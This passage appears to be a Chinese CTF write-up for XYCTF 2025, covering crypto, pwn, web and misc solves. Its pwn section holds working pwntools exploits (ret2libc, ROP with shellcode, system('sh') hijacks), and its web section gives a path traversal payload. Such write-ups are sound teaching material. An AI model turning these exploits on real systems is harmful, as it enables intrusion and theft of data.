for f in os.listdir(target_dir) \n                    if f.endswith('.txt') and os.path.isfile(os.path.join(target_dir, f))]\n        \n        if not txt_files:\n            print(\"No .txt files found in directory\")\n            return\n            \n        for txt_file in txt_files:\n            file_path = os.path.join(target_dir, txt_file)\n            try:\n                with open(file_path, 'rb') as f:\n                    test_data = f.read()\n                \n                ciphertext = sm4_encrypt(sm4_key, test_data)\n                encrypted_path = file_path + '.enc'\n                \n                with open(encrypted_path, 'wb') as f:\n                    f.write(ciphertext)\n            except Exception as e:\n                print(f\"Error processing {txt_file}: {str(e)}\")\n                \n    except Exception as e:\n        print(f\"Fatal error: {str(e)}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n发现将是多项式m转换为SM4密钥加密，p，d=3本来应该对enc多项式取模获得m，但是发现反编译出的文件有enc.txt和pub_key.txt，其中enc.txt里有两个多项式，使用第二个居然可以直接解密。\n\n```python\nfrom gmssl import sm4\nimport binascii\nimport re\n\ndef terms(poly_str):\n    terms = []\n    pattern = r'([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)'\n    matches = re.finditer(pattern, poly_str.replace(' ', ''))\n    \n    for match in matches:\n        print(match)\n        term = match.group()\n        if term == '+x' or term == 'x':\n            terms.append(1)\n        elif term == '-x':\n            terms.append(-1)\n        elif 'x^' in term:\n            coeff_part = term.split('x^')[0]\n            exponent = int(term.split('x^')[1])\n            if not coeff_part or coeff_part == '+':\n                coeff = 1\n            elif coeff_part == '-':\n                coeff = -1\n            else:\n                coeff = int(coeff_part)\n            terms.append(coeff * exponent)\n        elif 'x' in term:\n            coeff_part = term.split('x')[0]\n            if not coeff_part or coeff_part == '+':\n                terms.append(1)\n            elif coeff_part == '-':\n                terms.append(-1)\n            else:\n                terms.append(int(coeff_part))\n        else:\n            if term == '+1' or term == '1':\n                terms.append(0)\n                terms.append(-0)\n    \n    return terms\n\n# 解密函数\ndef sm4_decrypt(key_hex, ciphertext_hex):\n    key = binascii.unhexlify(key_hex)\n    print(len(key))\n    cipher = sm4.CryptSM4()\n    cipher.set_key(key, sm4.SM4_DECRYPT)\n    ciphertext = binascii.unhexlify(ciphertext_hex)\n    print(ciphertext)\n    plaintext = cipher.crypt_ecb(ciphertext)\n    return plaintext\n\ndef sm4_encrypt(key, plaintext):\n    assert len(key) == 16, \"SM4 key must be 16 bytes\"\n    cipher = sm4.CryptSM4()\n    cipher.set_key(key, sm4.SM4_ENCRYPT)\n    padded_plaintext = pad(plaintext, 16)\n    return cipher.crypt_ecb(padded_plaintext)\n\n\nm=\"-x^48 - x^46 + x^45 + x^43 - x^42 + x^41 + x^40 + x^36 - x^35 + x^34 - x^33 + x^32 - x^30 + x^29 - x^28 - x^27 - x^26 - x^25 - x^23 - x^22 + x^21 + x^20 + x^19 + x^18 - x^17 - x^16 - x^15 - x^14 - x^12 + x^9 - x^7 - x^6 - x^5 - x^4 + x^3 - x + 1\"\nm_ = terms(m)\nprint(m_)\n\ndef gen_key(poly_terms):\n    binary = [0] * 128\n    for term in poly_terms:\n        exponent = abs(term)\n        if term > 0 and exponent <= 127:  \n            binary[127 - exponent] = 1\n    binary_str = ''.join(map(str, binary))\n    hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32)\n    return hex_key\n\nhex_key = gen_key(m_)\nprint(hex_key)\n\nencrypted_flag = \"bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835\"\nflag = sm4_decrypt(hex_key, encrypted_flag)\nprint(\"Decrypted Flag:\", flag)\n```\n\nXYCTF{Crypto0_can_n0t_So1ve_it}\n\n\n\n### reed\n\n题目给出一个基于random的随机数生成器\n\n但是观察密文前两组是一样的，是同一个字符，根据出题人给出的其他参数，推测flag前几位是114514\n\n有两个不一样的m即可两组enc相减乘m差值的逆元获得a，即可获得a，b。解密即可\n\n```python\nimport string\nimport random\n\ntable = string.ascii_letters + string.digits\n\nr = random.Random()\n\nclass PRNG:\n    def __init__(self, seed):\n        self.a = 1145140\n        self.b = 19198100\n        random.seed(seed)\n\n    def next(self):\n        x = random.randint(self.a, self.b)\n        random.seed(x ** 2 + 1)\n        return x\n    \n    def round(self, k):\n        for _ in range(k):\n            x = self.next()\n        return x\n\ndef encrypt(msg, a, b):\n    c = [(a * table.index(m) + b) % 19198111 for m in msg]\n    return c\nfrom Crypto.Util.number import *\n\nenc=[10452836, 10452836, 9474070, 15547185, 10452836, 9474070, 6914981, 5936215, 1042385, 841866, 13966862, 10051798, 3978683, 5936215, 17103679, 15146147, 5936215, 9073032, 9073032, 3978683, 13966862, 14945628, 17103679, 12988096, 841866, 2999917, 3978683, 2021151, 9073032, 10452836, 1443423, 10452836, 1443423, 14568419, 10452836, 4379721]\n\nprng = PRNG(0)\n\nflag='114'\n\nencc=enc[0]-enc[2]\ninv_e=inverse(table.index('1')-table.index('4'),19198111)\nprint(inv_e)\n\namod=(enc[0]-enc[2])*inv_e%19198111\nprint(amod)\ninv_a=inverse(amod,19198111)\nprint(inv_a)\nb=enc[0]-amod*table.index('1')%19198111\n\nfor i in enc:\n    print(table[((i-b)*inv_a%19198111)],end='')\n\n\n\n```\n\n114514fixedpointissodangerous1919810\n\n\n\n### choice\n\n```python\nfrom Crypto.Util.number import bytes_to_long\nfrom random import Random\nfrom secret import flag\n\nassert flag.startswith(b'XYCTF{') and flag.endswith(b'}')\nflag = flag[6:-1]\n\nmsg = bytes_to_long(flag)\nrand = Random()\ntest = bytes([i for i in range(255, -1, -1)])\nopen('output.py', 'w').write(f'enc = {msg ^ rand.getrandbits(msg.bit_length())}\\nr = {[rand.choice(test) for _ in range(2496)]}')\n```\n\n给了2496组choice()，查看源码发现和getrandbits(8)相当，根据索引构建矩阵求解即可复原state，使用extend_mt19937_predictor溯源即可\n\nm长度可能与e有偏差，多试两位即可\n\n```python\nfrom Crypto.Util.number import *\nfrom random import *\nfrom tqdm import *\n\n\nwith open(\"/mnt/e/wenjian/p/timu/xyCTF/2025/choice/output.py\",\"r\") as f:\n    e=int(f.readline().split(\"=\")[1])\n    r=eval(f.read().split(\"=\")[1])\n\ntest = bytes([i for i in range(255, -1, -1)])\n\nDall=[]\nfor i in r:\n    Dall.append(test.index(i))\n\n\nprint(e)\nprint(Dall)\nprint(len(Dall))\nf.close()\n\nn=len(Dall)\nD=Dall\nrng=Random()\n\ndef getRows(rng):\n    #这一部分根据题目实际编写，必须和题目实际比特获取顺序和方式完全一致，且确保比特数大于19937，并且请注意zfill。\n    row=[]\n    for i in range(n):\n        row+=list(map(int, (bin(rng.getrandbits(32)>>(32-8))[2:].zfill(8))))\n    return row\nM=[]\n\nfor i in range(19968):#这一部分为固定套路，具体原因已经写在注释中了\n\n    state = [0]*624\n    temp = \"0\"*i + \"1\"*1 + \"0\"*(19968-1-i)\n    for j in range(624):\n        state[j] = int(temp[32*j:32*j+32],2)\n    rng.setstate((3,tuple(state+[624]),None)) #这个setstate也是固定格式，已于2025.1.21测试\n    M.append(getRows(rng))\n\n\nM=Matrix(GF(2),M)\nprint(M.rank())\n\n\ny=[]\nfor i in range(n):\n    y+=list(map(int, (bin(D[i])[2:].zfill(8))))\n\nprint(len(y))\nprint('--------------------------------------------------------------------------------------')\n\ny=vector(GF(2),y)\ns=M.solve_left(y)\n\n\nG=[]\nfor i in range(624):\n    C=0\n    for j in range(32):\n        C<<=1\n        C|=int(s[32*i+j])\n    G.append(C)\n\nimport random\nRNG1 = random.Random()\nfor i in range(624):\n    G[i]=int(G[i])\nprint(G)\n\n\n# G=[0, 490535307, 1496475985, 1304389653, 3073248862, 2386441930, 1822503478, 2020774719, 4023824107, 1480116190, 3595911337, 4199707216, 669968687, 826798707, 2615625545, 3915683430, 168325080, 829537011, 1165965885, 981460179, 2661311210, 316250339, 1045607037, 2688190930, 118171210, 3451453216, 3866477339, 2868202172, 1761379194, 1058828879, 1542168919, 2021772452, 2569206428, 2418006454, 3114112729, 1682301179, 3200486818, 599215990, 3404606484, 1911329240, 3444584517, 2269914870, 2733846467, 2801800027, 248142392, 1885498765, 860592907, 1802543044, 2381250266, 858114164, 2518994312, 962044368, 973015259, 3942118714, 3680009016, 2032313670, 3387751989, 1054484707, 2636564424, 1944206009, 2577425725, 1603497474, 392224733, 1859494210, 3997782846, 4192576547, 1107246885, 2404750701, 2157620568, 270457783, 2445196691, 3937008468, 3121127879, 2378519387, 425217735, 2564663584, 686095178, 2624185419, 3971886279, 2680818161, 2787863330, 2110546597, 687271821, 2277728162, 2803200905, 1049854254, 167450062, 3024645977, 3863615534, 423262694, 2034761849, 969338715, 1511630961, 2649226142, 366301301, 2130366793, 1560835738, 3571705620, 3487936619, 839414948, 1316270660, 568821823, 763054927, 2908961603, 1102984025, 3749009029, 449320085, 1308343884, 4157952695, 3187534659, 1580220597, 2173463099, 1595396219, 560342012, 3540854382, 370188528, 2936067839, 3845682323, 2060758533, 2636537833, 2045197349, 1945678739, 1987702201, 1386018091, 3389849161, 3658584265, 1063584606, 1609671890, 2147966037, 408763514, 173407274, 3026893195, 782093047, 612664728, 2008637303, 2231388523, 376518271, 2459748419, 2989539508, 1291508175, 739599924, 2787615130, 438993275, 3419636363, 396288162, 890864194, 2703944810, 2855282142, 3822277049, 2097517145, 3561662446, 3033564783, 1419618886, 1113476278, 1207289994, 51062508, 2200207646, 270434158, 3368286735, 1919259101, 2520477581, 3490526248, 575225377, 3390786656, 685824799, 2700369515, 1002309859, 71116734, 2055482703, 2658054435, 1094192336, 1947555707, 2442909426, 3499290994, 4054825654, 4162150808, 595324989, 2564147367, 2210623235, 3240656068, 2974526728, 1097736460, 3789121430, 990080517, 455497279, 591810412, 2723818619, 1828779877, 3360239376, 3698746341, 1962766646, 3891940910, 194869848, 3113141597, 4173680019, 2492879487, 1782458264, 2644873038, 3057000015, 1477560683, 260635038, 4014541913, 2475381256, 3432141583, 1449600258, 1806521550, 3993006180, 1144296388, 291996587, 2791231577, 2014376521, 3385338386, 3917594173, 4112262622, 3881010559, 1879348257, 4088686127, 943465051, 2717992292, 281219314, 829214474, 1429253889, 896560967, 4022504673, 1679700533, 4084224237, 3205942608, 3596088508, 2112079603, 3786503446, 2339855853, 358914192, 1821223774, 3764762766, 574390400, 230757101, 1681353616, 1404353461, 474457722, 818843357, 1916555525, 1478313262, 1376597702, 1725676847, 2410606224, 160362913, 165431882, 679714160, 578803644, 1251384768, 781503133, 252645721, 1216677581, 745854028, 4257762445, 232057782, 4131450922, 2243258111, 2680095923, 2131010707, 1945987666, 3649103696, 1306908197, 3923095658, 1586814958, 4275479481, 1792900040, 3513683706, 3043365645, 1598493028, 32483759, 212292997, 2484980536, 833036523, 446172640, 469599570, 1783543378, 34817764, 381132111, 1816020014, 3267362667, 223013760, 3717861858, 1981643591, 3438213528, 1159293740, 1087473027, 1845306386, 1597047436, 811182716, 4036992807, 866266593, 2817126195, 2583634769, 4227649879, 2672651673, 1158298570, 1147396726, 2938397432, 1542609148, 4196176929, 4064670511, 2395573335, 529637852, 4218916776, 2144528354, 1480788832, 1397451235, 1376724653, 2972863103, 3126088025, 1754053571, 61572923, 1962366418, 3209345005, 1135973797, 2282020151, 1617329326, 2165555451, 1335819294, 4274157719, 26224158, 836546160, 1863920790, 3735102502, 226852542, 621648448, 2125683057, 2719749744, 2624596686, 1627646676, 1476402803, 1157882819, 2139666545, 4224008503, 538777205, 160235477, 1389743733, 4255663843, 1232932267, 714165924, 3360017571, 3861531699, 1259644568, 1889531702, 3835320074, 962334880, 2655642856, 2626363498, 1891384806, 1801620109, 1897599626, 3687809766, 1522030816, 1513382903, 3712790758, 3610944389, 2016393056, 1006803814, 517272163, 2093521873, 3521116957, 365700165, 127017649, 1034144380, 383768854, 814208276, 794839368, 2538604191, 1941513101, 1342716317, 3555862634, 856481495, 2490707626, 3583375428, 2805836257, 245564123, 3108295323, 1565518856, 2649180690, 3332256362, 332138267, 2753126792, 1373150168, 3689890710, 223149061, 2451398005, 2044764250, 253027501, 3654914798, 3071035850, 4073951612, 690760932, 2576679227, 1899001759, 3179694571, 549833987, 3103159161, 2749555997, 3701137981, 103780406, 3880550485, 641014351, 614977565, 3252106272, 1500800921, 2346355748, 1437619729, 3713115526, 4169303983, 953535013, 722731441, 3485174363, 1123805551, 596536035, 1466804419, 3185872953, 2541958005, 909181586, 2235810910, 2325856501, 1907373845, 3395068733, 3727013849, 3129841537, 2209755148, 386103378, 959714264, 4059368152, 3171578698, 1935673297, 1334114851, 2000714717, 291544611, 2924507130, 1118846473, 834320931, 290128353, 758935454, 1295926016, 1596770824, 1977132939, 3804148806, 3591309623, 4209845635, 2998785209, 3353138216, 1739365771, 228727322, 2787865152, 4064361337, 3898185832, 628696008, 805010811, 2283970114, 261773773, 373115591, 2811158375, 2209330766, 476245752, 2727559206, 729386039, 3598648760, 227347764, 2772461981, 3927693335, 772797350, 1215579938, 1991587620, 1968980116, 213188572, 1455236565, 646373577, 3221190285, 2407608088, 388710597, 3068317471, 560173616, 2384843322, 2804823319, 3296469232, 4132838759, 1166039793, 1651089967, 1217559362, 1466724612, 3066497469, 2542065239, 1548132571, 2252598557, 1114227092, 315950281, 4260294426, 390016269, 237846157, 666128591, 4104218965, 4052610947, 2880940708, 679949465, 3265033554, 2618804058, 1983265063, 3934746131, 3851626972, 2695590210, 277341758, 2496522831, 2390301598, 1237676785, 541056536, 559487185, 878088736, 1654760693, 3091440937, 4184991854, 4277345620, 4128668672, 3475002233, 1191304304, 410233597, 1753481581, 522497440, 3490095733, 1740782454, 279075776, 4111542987, 1488482616, 2358022381, 2420694338, 4051823347, 2839869382, 700753851, 4187502580, 3609799609, 3816223830, 3465776160, 2643572446, 2117522904, 337820788, 4095876916, 4027724494, 3030168724, 2966453700, 750155676, 2187990790, 1012578929, 1502179669, 1028354250, 3886098849, 422175433, 1312545625, 3002465781, 1095759919, 364274776, 608451515, 539138648, 3725177121, 2681745835, 2060057886, 2467932655, 1328800475, 3777619753, 871763400, 3312924583, 2674204807, 4159118820, 3502457342, 3533526784, 2392773867, 3758459535, 313416918, 2746154645, 2040485405, 3212871698, 3744071701, 1518338816, 2076259952, 2344700130, 3755882401, 1001438918, 2331345786, 573931854, 371837673, 2890869138, 773771187, 2205676903, 1136370498, 1687795223, 3691084510, 2583108857, 1618641671, 1809021081, 3933440855, 2749174598, 530562158, 2653872255, 2070076429, 467552727, 577607036, 459715927, 1232385236, 495255405, 225866996, 3871108981, 565101302, 373456503, 1504979081, 761278333, 2227115284, 3700809837, 3597612966, 517375768, 108496019, 2916932837, 2100375706, 746007798, 216873417, 3182230215, 3523337342, 365334474, 612842567, 532858878, 3162228125]\n\nfor i in range(624):\n    G[i]=int(G[i])\n    \n\nimport random\nRNG1 = random.Random()\nRNG1.setstate((int(3),tuple(G+[int(624)]),None))\n\n\nfrom extend_mt19937_predictor import ExtendMT19937Predictor\n\npredictor = ExtendMT19937Predictor()\n\nfor _ in range(624):\n    predictor.setrandbits(RNG1.getrandbits(32), 32)\n\nfor _ in range(624):\n    predictor.backtrack_getrandbits(32)\n    \nkey=predictor.backtrack_getrandbits(e.bit_length()+3)\n\nfrom Crypto.Util.number import *\n\nprint(long_to_bytes(e^^key))\n```\n\n___0h_51mple_r@nd0m___\n\n\n\n### 复复复复数\n\n四元数的逆元为其共轭数除以模长的平方，根据已知可以求得p，q，r\n\n但是e有个因子3，但是m其实十分小，计算阶然后除以公因数即可直接解出\n\n```python\nclass ComComplex:\n    def __init__(self, value=[0,0,0,0]):\n        self.value = value\n    def __str__(self):\n        s = str(self.value[0])\n        for k,i in enumerate(self.value[1:]):\n            if i >= 0:\n                s += '+'\n            s += str(i) +'ijk'[k]\n        return s\n    def __add__(self,x):\n        return ComComplex([i+j for i,j in zip(self.value,x.value)])\n    def __mul__(self,x):\n        a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3]\n        b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2]\n        c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1]\n        d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0]\n        return ComComplex([a,b,c,d])\n    def __mod__(self,x):\n        return ComComplex([i % x for i in self.value])\n    def __pow__(self, x, n=None):\n        tmp = ComComplex(self.value)\n        a = ComComplex([1,0,0,0])\n        while x:\n            if x & 1:\n                a *= tmp\n            tmp *= tmp\n            if n:\n                a %= n\n                tmp %= n\n            x >>= 1\n        return a\n        \n    def inv(l,mod):\n        inv_len=inverse(sum(i**2 for i in l),mod)\n        return ComComplex([l[0]*inv_len%mod,-l[1]*inv_len%mod,-l[2]*inv_len%mod,-l[3]*inv_len%mod])\n\n\nfrom Crypto.Util.number import *\n\nhints = [375413371936,452903063925,418564633198,452841062207]\ngift = [8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729,20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171,22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868,40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863]\nP = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109\nn = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367\nc = ComComplex([212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103,24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825,45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125,96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385])\ne=65547\n\ninv=ComComplex.inv(hints,P)\ngifts=ComComplex(gift)\nkeys=inv*gifts%P\nprint(keys)\n\n_,p,q,r=keys.value\nprint(p*q*r-n)\n\nprint(GCD(e,(p-1)*(q-1)*(r-1)))\nprint(GCD(e,p-1))\nprint(GCD(e,q-1))\nprint(GCD(e,r-1))\n\n\nd=inverse(e,(q**4-q**3-q**2+q)//3)\nm=pow(c,d,q)\n\nfor i in m.value:\n    print(long_to_bytes(i).decode(),end='')\n\n\n\n```\n\nflag{Quaternion_15_ComComComComplexXXX!!!?}\n\n## Pwn\n\n### Ret2libc's Revenge\n\n溢出可以写负数来改返回地址，之后ret2libc就行\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"DEBUG\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"./chal\")\nio=remote(\"47.93.96.189\", 36879)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n\tgdb.attach(io, gdbscript=script)\n\n#debug(\"break *0x40127A\")\n#debug()\n\n#target=0x404000-0x20\ntarget=0x4005b0+8-0x20\nrbp=0x040117d\nrsi_0=0x00000000004010e4\nadd_rsi=0x04010eb\nputs=0x404018\nrdi_rsi=0x0401180\nplt=0x0401070\nmain=0x40127B\nret=0x00000000004012a9\n\nnum=0xffffffff-0x12-0xc8\np=\"A\"*(528)+p64(puts)+p32(num)+p32(num)+p64(rbp)+p64(target)+p64(rsi_0)+p64(add_rsi)\np+=p64(rdi_rsi)+p64(plt)+p64(main)\nfor i in range(160):\n\tsl(p)\n\nlibc=u64(ru(\"\\x7f\",False)[-6:].ljust(8, \"\\0\"))-0x21b780\nprint hex(libc)\n\n\nrsi=libc+0x2be51\nrsi_rdx=libc+0x118f2f\nrdi=libc+0x2a3e5\n\nbinsh=libc+0x1d8678\nsystem=libc+0xeb080\nprint hex(system)\n\np=\"A\"*(528+8)+p32(num)+p32(num)+p64(rbp)+p64(0x4040a0)+p64(rdi)+p64(binsh)+p64(rsi)+p64(0)+p64(rsi_rdx)+p64(system)\nsl(p)\nshell()\n```\n\n\n\n### web苦手\n\n两个密码生成的密钥只要最高位为00就可以绕过检测\n\n```python\nimport hashlib\nimport itertools\nimport string\n\nsalt = b\"XYCTF\"\niterations = 1\ndklen = 32\n\ncharset = string.ascii_letters + string.digits  # a-zA-Z0-9\n\nfor length in range(66, 67):\n    for candidate in itertools.product(charset, repeat=length):\n        password = ''.join(candidate).encode()\n        key = hashlib.pbkdf2_hmac(\"sha1\", password, salt, iterations, dklen)\n        if key[0] == 0:\n            print(\"Found password:\", password.decode(errors=\"ignore\"))\n            exit()\n\n#J\n#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae2\n\n```\n\n用这两个密码登陆之后目录穿越拿到真的flag\n\n```python\n../../..//flag\n```\n\n### girlfriend\n\n栈迁移打mprotect，之后用openat, mmap, write 读flag\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"DEBUG\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"./chal\")\nio=remote(\"47.94.15.198\", 34840)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n    gdb.attach(io, gdbscript=script)\n\n\nsa(\":\",\"3\")\np=\"%7$p-%15$p-%3$p\"\nsa(\"first\", p)\nru(\"name:\\n\")\nleak=ru(\"Y\").split(\"-\")\ncanary=eval(leak[1])\npie=eval(leak[0])-0x18d9\nlibc=eval(leak[2])-0x114887\nprint hex(canary)\nprint hex(pie)\nprint hex(libc)\n\nread=libc+0x1147d0\nret=pie+0x0157B\nrdi=libc+0x2a3e5\nrax=libc+0x45eb0\nrsi=libc+0x02be51\nr12=libc+0x35731\nrdx_r12_r13=libc+0xa80c8\nmprotect=libc+0x11eaa0\ncall=libc+0x29d8e\n\nsa(\":\",\"3\")\n\nrop=\"X\"*0x30+p64(0)\nrop=rop.ljust(0x100, \"X\")\n\nsc=asm(\"\"\"\nmovabs rax, 0x67616C66\npush 0\npush rax\npush rsp\nmov rdi, -100\npop rsi\nxor rdx, rdx\nxor r10, r10\nmov rax, 0x101\nsyscall #openat(AT_FDCWD, \"flag.txt\", 0, 0);\n\nmov rdi, 0x1337000\nmov rsi, 0x1000\nmov rdx, 1\nmov r10, 1\nmov r8, rax\nxor r9, r9\nmov rax, 0x9\nsyscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);\n\nmov rdi, 1\nmov rsi, 0x1337000\nmov rdx, 0x100\nmov rax, 1\nsyscall\n\"\"\")\n\nrop=\"\"\nrop+=p64(rdi)+p64(pie+0x4000)\nrop+=p64(rsi)+p64(0x2000)\nrop+=p64(rdx_r12_r13)+p64(7)+p64(0)\nrop+=p64(rdx_r12_r13)+p64(7)+p64(0)\nrop+=p64(mprotect)\n#rop+=p64(rdi)+p64(0)\n#rop+=p64(rsi)+p64(pie+0x4000+0x1000)\n#rop+=p64(r12)+p64(0x100)\n#rop+=p64(rdx_r12_r13)+p64(0)*2\n#rop+=p64(read)\nrop+=p64(rax)+p64(pie+0x40d0)\nrop+=p64(call)\nrop+=sc\n\nprint len(rop)\nsa(\"first\", rop)\n\nsla(\"Choice:\", \"1\")\np=\"A\"*56+p64(canary)+p64(pie+0x04060-8)+p64(pie+0x1676)\n#p=\"A\"*56+p64(canary)+\"A\"*8+p64(pie+0x1220)\n#debug()\nsa(\"?\", p)\n\n\nsc=asm(\"\"\"\nmovabs rax, 0x67616C66\npush 0\npush rax\npush rsp\nmov rdi, -100\npop rsi\nxor rdx, rdx\nxor r10, r10\nmov rax, 0x101\nsyscall #openat(AT_FDCWD, \"flag\", 0, 0);\n\nmov rdi, 0x1337000\nmov rsi, 0x1000\nmov rdx, 1\nmov r10, 1\nmov r8, rax\nxor r9, r9\nmov rax, 0x9\nsyscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);\n\nmov rdi, 1\nmov rsi, 0x1337000\nmov rdx, 0x100\nmov rax, 1\nsyscall\n\"\"\")\n\n\n#debug()\nshell()\n```\n\n\n\n### 明日方舟寻访模拟器\n\n让count变成sh之后传给system，因为输出被关所以把输出道到stderr\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"./chal\")\nio=remote(\"47.94.172.18\", 28754)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n        gdb.attach(io, gdbscript=script)\n\n\np=\"A\"*72+p64(0x4018e5)+p64(0x405bcc)+p64(0x04018FC)\n\nsl(\"1\")\n\nsh=0x6873\nwhile sh>10000:\n        sl(\"3\")\n        sl(\"10000\")\n        sl(\"3\")\n        sh-=10000\n\nsl(\"3\")\nsl(\"6739\")\nsl(\"3\")\n\nsl(\"4\")\nsl(\"1\")\n#debug()\ns(p)\n\nsl(\"cat flag 1>&2\")\nshell()\n```\n\n\n\n### EZ 3.0\n\nmips rop\n\n```python\n0x00400a20 : lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop\n```\n\n这gadget可以把a0和t9控制，再跳到t9，a0为函数参数。把a0变成/bin/cat flag.txt，t9变成system\n\n\n\n```python\nfrom pwn import *\n\ncontext(arch='mips',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process([\"qemu-mipsel\",\"-g\",\"1234\",\"./ez\"])\nio=remote(\"47.94.15.198\", 26720)\n#a=process(\"./ez\")\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n\tgdb.attach(a, gdbscript=script,arch=\"mips\")\n\ncat=0x0411010\ngadget=0x00400a20\n\n#p=\"A\"*(32+4*1)+p32(0x004009c8)\np=\"A\"*(32+4)+p32(gadget)+p32(cat)+p32(0x400b70)+p32(cat)\n#pause()\n\nsa(\">\", p)\n\nshell()\n```\n\n## Misc\n\n### 签个到吧\n\n```bash\nn```\n\nBrainFuck，但是观察到没有 `.` 来输出，在每部分后加上即可\n\n```vbnet\nn```\n\nflag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}\n\n### 曼波曼波曼波\n\nsmn.txt的base64逆序，后发现jpg文件头，保存为文件\n\n![](/images/download-1744626745339-68.jpg)\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\n010查看发现后面跟了PK，binwalk分解得到压缩包\n\n提示说，密码是什么来着，有点记不清了，呜呜呜呜 好像是什么比赛名字加年份\n\n还以为有什么其他的，掩码爆破了一下发现密码确实是XYCTF2025\n\n给了两张一样的图片，双图盲水印秒了\n\n![](/images/EASY_1_decpy3-1744626745339-69.png)\n\n\n\n### MADer也要当CTFer\n\n提取mkv文件的字幕轨subs.ass\n\n发现是一堆hex提取出一个RIFX开头的文件，发现是一个aep文件\n\n使用ae打开，发现有图层\n\n![](/images/1743836629066-03a76683-7499-468d-85f3-3fb10439a989-1744626745339-70.png)\n\n取消设置隐藏\"消隐\"的图层，可以看到有一写文字，flag在flag2这个文本中，需要调一下缩放就可以复制其中的内容了。\n\n![](/images/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21-1744626745339-72.png)\n\nflag{l_re@IIy_w@nn@_2_Ie@rn_AE}\n\n### 会飞的雷克萨斯\n\n看图猜到是之前小孩炸车事件，直接百度该事件。\n\n![](/images/QQ_1743832187198-1744626745339-71.png)\n\n得到地址：四川省内江市资中县春岚北路\n\n后面XXXXXX内通过地图看应该是中铁城市中心\n\n![](/images/QQ_1743832241003-1744626745339-73.png)\n\nflag{四川省内江市资中县春岚北路中铁城市中心内}\n\n### XGCTF\n\n搜索关键词找到题目名称：**easy_polluted**\n\n![](/images/QQ_1743832317067-1744626745339-74.png)\n\n![](/images/1743832324744-64f7289f-3287-4b94-996f-1b63731e7717-1744626745335-1.png)\n\ngithub可以搜到dragonkeep\n\n通过访问他的.github.io会重定位到\n\n![](/images/QQ_1743832409731-1744626745339-76.png)\n\n找到第一篇文章。\n\n![](/images/QQ_1743832453654-1744626745339-75.png)\n\nf12找到flag进行base64解密。\n\n![](/images/QQ_1743832482740-1744626745339-77.png)flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me}\n\n### 